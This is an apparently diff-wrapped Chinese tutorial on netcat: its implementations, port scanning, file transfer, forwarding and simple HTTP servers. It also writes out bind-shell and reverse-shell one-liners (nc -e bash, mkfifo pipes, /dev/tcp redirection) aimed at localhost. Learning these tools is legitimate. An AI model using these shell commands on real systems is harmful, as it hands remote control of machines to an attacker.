@@ -1,0 +1,305 @@
+<h2>原文：<a href="https://f2h2h1.github.io/article/nc%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%8E%9F%E7%90%86">nc的使用和原理</a></h2>
+<h1>nc的使用和原理</h1>
+<h2>nc的简介</h2>
+<p>nc 是 netcat 的缩写。</p>
+<p>nc 是一个用于处理网络连接的工具。</p>
+<p>netcat 的原始版本是一个 Unix 程序。
+最后一个版本 （1.10） 于 1996 年 4 月发布。原作者叫做 Hobbit 。</p>
+<ul>
+<li>https://nc110.sourceforge.io/</li>
+<li>https://sourceforge.net/projects/nc110/</li>
+<li>https://sourceforge.net/p/nc110/git/ci/master/tree/</li>
+</ul>
+<p>现在的 nc 有很多种实现。下面是常见的五种实现。</p>
+<ul>
+<li>GNU 版<ul>
+<li>包名通常为 nc-traditional netcat-traditional</li>
+<li>https://snapshot.debian.org/package/netcat/</li>
+</ul>
+</li>
+<li>openbsd 版<ul>
+<li>包名通常为 nc-openbsd netcat-openbsd</li>
+<li>https://github.com/openbsd/src/blob/master/usr.bin/nc</li>
+</ul>
+</li>
+<li>nmap 版<ul>
+<li>ncat 通常是指 nmap 版的 nc</li>
+<li>ncat 的包名通常是 ncat nmap-ncat</li>
+<li>https://github.com/nmap/nmap/tree/master/ncat</li>
+<li>ncat 是 nmap 项目的组成部分。</li>
+<li>Nmap (“Network Mapper(网络映射器)”) 是一个免费的开源实用程序，用于 网络发现和安全审核。</li>
+<li>除了经典的命令行 Nmap 可执行文件之外，Nmap 套件包括<ul>
+<li>高级 GUI 和结果查看器 （Zenmap），</li>
+<li>一个灵活的数据 传输、重定向和调试工具 （Ncat），</li>
+<li>一个实用程序 比较扫描结果 （Ndiff）</li>
+<li>数据包生成和响应分析工具 （Nping）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>socat<ul>
+<li>socat 的官方文档描述它是 "netcat++" (extended design, new implementation)</li>
+<li>socat 的包名就是 socat</li>
+<li>socat 是 socket cat 的缩写</li>
+<li>http://www.dest-unreach.org/socat/</li>
+</ul>
+</li>
+<li>BusyBox 版<ul>
+<li>https://github.com/mirror/busybox/blob/master/networking/nc.c</li>
+<li>同样地 toybox 里也有一个 nc</li>
+</ul>
+</li>
+<li>除此之外，还有一个 cryptcat<ul>
+<li>cryptcat 是 netcat 的变体，基本上就是多了一个 密码 的参数</li>
+<li>cryptcat 好像是来自 kali linux</li>
+</ul>
+</li>
+</ul>
+<p>多数情况下 nc 或 netcat 是指 GNU 版 或 openbsd 版，一般系统自带的是 GNU 版</p>
+<ul>
+<li>判断当前系统的 nc 版本
+先用 type nc
+再用 realpath 或 ls -l 查看 nc 的真实路径，最好用 realpath
+类似这样 realpath /bin/nc</li>
+</ul>
+<p>socat 和 ncat 和 nc-openbsd 都支持 tls 。
+从功能上看。
+BusyBox nc &lt; nc-traditional &lt; nc-openbsd &lt; ncat &lt; socat</p>
+<h2>nc的使用</h2>
+<p>nc 扫描端口</p>
+<pre><code>nc -v -i 1 127.0.0.1 801
+nc -v -z -i 1 127.0.0.1 801
+nc -v -z -i 1 127.0.0.1 800-900
+不是所有版本的nc都支持 z 参数，不是所有版本的 nc 支持批量端口扫描
+</code></pre>
+<p>nc 实现聊天</p>
+<pre><code>最简单的一对一
+    nc -l 801
+    nc 127.0.0.1 801
+</code></pre>
+<p>nc 传输文件</p>
+<pre><code>接收端先运行一个 nc
+    nc -l 801 &gt; output.txt
+发送端再运行一个 nc
+    nc 127.0.0.1 801 &lt; input.txt
+</code></pre>
+<p>nc 实现一个转发服务</p>
+<pre><code>nc 自己调用自己
+nc -v -l -k -p 9901 -e "nc 127.0.0.1 9902"
+nc -v -l -k -p 9901 -e "bash -c \"nc 127.0.0.1 9902\""
+使用管道
+mkfifo pipe1;cat pipe1 | nc -v -l -p 9901 | /bin/bash -c "nc 127.0.0.1 9902" 2&gt;&amp;1 1&gt;pipe1;
+</code></pre>
+<p>nc 实现远程 shell</p>
+<pre><code>远程 shell
+    nc -v -l -p 9901 -e "bash"
+控制端
+    nc -v 127.0.0.1 9901
+即使没有 -e 参数，也能通过管道实现各种奇技淫巧，虽然管道的奇技淫巧只能处理单个连接
+    mkfifo pipe1;cat pipe1 | nc -v -l -p 9901 | /bin/bash 2&gt;&amp;1 1&gt;pipe1;
+</code></pre>
+<p>nc 实现远程反向 shell</p>
+<pre><code>控制端先运行一个 nc
+    nc -v -l -p 9901
+目标机器上连接控制机器的 9901 端口，并将其shell绑定到该连接上
+    nc -v 127.0.0.1 9901 -e "bash"
+    mkfifo pipe1; cat pipe1 | nc -v 127.0.0.1 9901 | /bin/bash 2&gt;&amp;1 1&gt;pipe1;
+    exec 3&lt;&gt;/dev/tcp/127.0.0.1/9901; exec 0&gt;&amp;3; exec 1&lt;&amp;3; /bin/bash 2&gt;&amp;1;
+    exec 3&lt;&gt;/dev/tcp/127.0.0.1/9901; /bin/bash 2&gt;&amp;1 0&gt;&amp;3 1&lt;&amp;3; 这种写法似乎更好
+</code></pre>
+<p>用 ncat 实现最简单的五个协议</p>
+<pre><code>参考这个网页
+https://nmap.org/ncat/guide/ncat-simple-services.html
+
+echo
+    while read -r line; do echo "$line"; done
+    echo 123 | while read -r line; do echo "$line"; done
+    echo -e "123\n321" | while read -r line; do echo "$line"; done
+    nc -l -k -p 9901 -e "cat $@"
+daytime
+    date -u "+%d %b %y %k:%M:%S %z"
+    date -u --rfc-2822
+    date -u --rfc-3339="seconds"
+    date -u --iso-8601="seconds"
+time
+    date +%s | awk '{printf "%#x", $1+2209017600}' | xxd -r
+discard
+    while read -r line; do echo "$line" &gt; /dev/null; done
+chargen
+    lineLimit=72;offset=0;count=0;while true; do for ((i=0; i&lt;$lineLimit; i++)); do tag=$((($i + $offset) % 95)); printf "\x$(printf %x $(($tag + 32)))"; done; offset=$(($offset + 1)); if [ $offset -ge 95 ]; then offset=0; fi; printf "\n";count=$(($count + 1)); done;
+
+</code></pre>
+<p>nc 如何模拟 telnet 客户端？</p>
+<p>nc 也可以像 telnet 那样模拟 http 客户端</p>
+<pre><code>nc www.baidu.com 80
+连接后，快速地输入 GET / HTTP/1.0 然后连续输入两个回车，就能返回网页内容
+又或者直接一句命令
+    printf 'GET / HTTP/1.0\r\nHost:www.baidu.com\r\n\r\n' | nc www.baidu.com 80
+</code></pre>
+<p>nc 如何模拟 http 服务器</p>
+<ul>
+<li><p>输出固定的内容</p>
+<pre><code>如果支持 参数 k
+trap "{ kill $$; }" SIGINT;while true; do nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\""; sleep 1s; done;
+
+如果不支持 参数 k
+while true; do { echo -e 'HTTP/1.1 200 OK\r\nContent-Length: 11\r\n\r\n'; echo helloworld; } | nc -v -l -k -p 9901; sleep 0.5s; done
+
+能保持运行，但每次只能处理一个请求，通过连续两次 ctrl+c 退出，但个请求都要等待一秒
+</code></pre>
+</li>
+<li><p>输出动态内容</p>
+<pre><code>动态输出内容的命令会写得非常的长，而且还有很多转义字符需要处理，所以最后还是写成了脚本的形式
+nc -v -l -p 9901 -c ./http.sh
+同样地需要关注 nc 是否支持参数 k ，需要有两种不一样的写法，参考上面的就可以了
+参数k的作用是重复处理连接，如果没有参数k，nc会只处理一个连接就退出了
+
+这是 http.sh 的内容
+#!/bin/bash
+echo -n "HTTP/1.0 200 OK"
+echo -e -n "\r\n"
+echo -n "Content-Length: 11"
+echo -e -n "\r\n\r\n"
+echo "helloworld"
+
+已经有人做了类似的了
+https://github.com/avleen/bashttpd
+netcat -lp 9901 -e ./bashttpd
+</code></pre>
+</li>
+<li><p>测试用的命令</p>
+<pre><code>curl -v 127.0.0.1:9901
+nc 127.0.0.1 9901
+</code></pre>
+</li>
+</ul>
+<p>&lt;!--
+    nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\"";
+    这一句是可行的，无法保持运行
+    while true; do nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\""; done;
+    这一句是可行的，能保持运行，但每次只能处理一个请求，但无法退出
+    trap "{ kill $$; }" SIGINT;while true; do nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\""; sleep 1s; done;
+    这一句是可行的，能保持运行，但每次只能处理一个请求，通过连续两次 ctrl+c 退出，但个请求都要等待一秒
+    trap "{ kill $$; }" SIGINT;while true; do nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\""; sleep 0.5s; done;
+    这一句是可行的，能保持运行，但每次只能处理一个请求，通过连续两次 ctrl+c 退出，但个请求都要等待零点五秒，如果等待时间太短就无法通过连续两次 ctrl+c 退出了
+    while true; do nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\""; sleep 0.5s; done;
+    这一句是可行的
+    while true; do { echo -e 'HTTP/1.1 200 OK\r\nContent-Length: 11\r\n\r\n'; echo helloworld; } | nc -v -l -k -p 9901; sleep 0.5s; done
+    这一句是可行的
+    trap "{ kill $$; }" SIGINT;while true; do nc -v -l -k -p 9901 -e ./http.sh; sleep 0.5s; done;
+    这是运行脚本文件的例子
+    这是脚本文件的内容
+        #!/bin/bash
+        echo -n "HTTP/1.0 200 OK"
+        echo -e -n "\r\n"
+        echo -n "Content-Length: 11"
+        echo -e -n "\r\n\r\n"
+        echo "helloworld"
+    测试用的命令
+        curl -v 127.0.0.1:9901
+        nc 127.0.0.1 9901
+    已经有人做了类似的了
+        https://github.com/avleen/bashttpd
+        netcat -lp 9901 -e ./bashttpd
+        我试过了，这个是可行的
+
+
+nc 有哪些通用的语法？
+    似乎除了 -l 之外，其它参数都有变动
+    最稳妥的方式还是通过 -h 来查看帮助
+
+--&gt;</p>
+<h3>windows 如何使用 nc</h3>
+<ul>
+<li>github 上有好几个 windows 版的 nc ，但都很久没更新了<ul>
+<li>https://github.com/diegocr/netcat</li>
+<li>https://github.com/int0x33/nc.exe</li>
+</ul>
+</li>
+<li>先下载 windows 版的 busybox ，再使用 busybox 里的 nc<ul>
+<li>https://frippery.org/busybox/</li>
+<li>https://github.com/rmyorston/busybox-w32</li>
+<li>要下载 busybox64u.exe 这个版本，64位且支持 unicode ，虽然这个版本只支持 win10和win11</li>
+</ul>
+</li>
+<li>nmap 也有提供 windows 版的 nc<ul>
+<li>https://nmap.org/ncat/</li>
+<li>https://sectools.org/tool/netcat/</li>
+<li>https://nmap.org/book/ncat-man.html</li>
+<li>https://nmap.org/ncat/guide/index.html</li>
+</ul>
+</li>
+<li>windows 版的 ncat 最好还是在 bash 里运行。。。</li>
+<li>或者用 脚本 语言自己实现一个也可以。。。</li>
+</ul>
+<h2>nc的原理</h2>
+<h3>大致原理</h3>
+<ul>
+<li>只处理连接</li>
+<li>socket一部分参数可以通过命令行传入，例如 -w -u 这类</li>
+<li>把socket的输入和输出重定向到标准输入和标准输出</li>
+</ul>
+<h3>nc 的源码</h3>
+<ul>
+<li>nc-traditional<ul>
+<li>可以下载到源码，但不能在线预览，bz2 的那个才是源码</li>
+<li>https://snapshot.debian.org/package/netcat/</li>
+<li>https://manpages.debian.org/bookworm/netcat-traditional/nc.traditional.1.en.html</li>
+</ul>
+</li>
+<li>nc-openbsd<ul>
+<li>https://github.com/openbsd/src/blob/master/usr.bin/nc/netcat.c</li>
+</ul>
+</li>
+<li>nmap 的 nc<ul>
+<li>https://nmap.org/ncat/</li>
+<li>https://github.com/nmap/nmap/tree/master/ncat</li>
+<li>https://github.com/nmap/nmap/blob/master/ncat/ncat_main.c</li>
+</ul>
+</li>
+<li>socat 的源码镜像，但很久没更新了<ul>
+<li>https://github.com/3ndG4me/socat</li>
+<li>源码可以直接在官网里下载 gz 文件 http://www.dest-unreach.org/socat/</li>
+</ul>
+</li>
+<li>BusyBox nc<ul>
+<li>https://github.com/mirror/busybox/blob/master/networking/nc.c</li>
+</ul>
+</li>
+<li>原始版本的nc，也是很久都没更新了<ul>
+<li>https://sourceforge.net/p/nc110/git/ci/master/tree/</li>
+</ul>
+</li>
+</ul>
+<h3>如何实现一个 nc</h3>
+<ul>
+<li>实现一个客户端</li>
+<li>实现一个服务端</li>
+</ul>
+<p>用 python 和 php 实现一个 nc</p>
+<p>如果 bash 有 /usr/lib/bash/accept 这个特性，那么直接用 bash 实现一个 nc 也不是不可以的</p>
+<p>&lt;!--
+用 python 和 php 实现一个 nc ，只实现 -h -l -e 这三个参数即可。
+
+理论上只要实现了 l p e 三个参数就能作为服务端运行
+即使没有 e 参数，也能通过管道实现各种奇技淫巧
+也就是只需要实现 l p 即可
+
+c 如何实现一个交互式的命令行？
+php 如何实现一个交互式的命令行？
+python 如何实现一个交互式的命令行？
+
+https://github.com/mirror/busybox/blob/master/networking/telnet.c
+https://github.com/mirror/busybox/blob/master/networking/telnetd.c
+
+https://docs.python.org/zh-cn/3/library/telnetlib.html
+https://github.com/python/cpython/tree/3.12/Lib/telnetlib.py
+    这个文件似乎能直接作为 telnet 客户端使用
+    python telnetlib.py [-d] ... [host [port]]
+https://www.cnblogs.com/mrlayfolk/p/15154813.html
+
+https://github.com/search?q=telnet+language%3AC&amp;type=repositories&amp;l=PHP&amp;s=stars&amp;o=desc
+https://github.com/fijiwebdesign/php-telnet
+https://github.com/diotteo/TelnetClient.php
+
+--&gt;</p>
